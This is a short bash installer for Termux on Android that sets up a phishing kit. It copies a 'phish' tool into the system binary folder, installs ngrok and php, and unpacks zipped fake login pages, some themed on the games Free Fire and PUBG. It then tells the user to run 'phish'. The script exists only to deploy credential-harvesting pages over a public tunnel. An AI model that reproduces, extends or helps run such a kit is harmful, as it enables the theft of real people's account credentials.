#! /bin/bash
cd 
cd /data/data/com.termux/files/usr/bin
rm -rf phish
rm -rf details
echo "removing all old phishing files"
cd 
cd Phishing
cp -r details /data/data/com.termux/files/usr/bin
cp -r phish /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod 775 phish
chmod 775 details
cd
cd Phishing
mv ngrok $HOME
cd
chmod +x *
cp -r ngrok /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod 775 ngrok
cd 

cd Phishing
echo "installing files"
mkdir WebPages
unzip WebPages1.zip
unzip WebPages2.zip
unzip WebPages3.zip
unzip games.zip
mkdir games
mv freefire games
mv pubg games
mv WebPages1 WebPages
mv WebPages2 WebPages
mv  WebPages3 WebPages
mv games WebPages
rm -rf WebPages1.zip
rm -rf games.zip
rm -rf WebPages2.zip
rm -rf WebPages3.zip
cd
chmod +x *
pkg install gem -y
gem install lolcat
pkg install php



echo "run tool by writing -- phish"
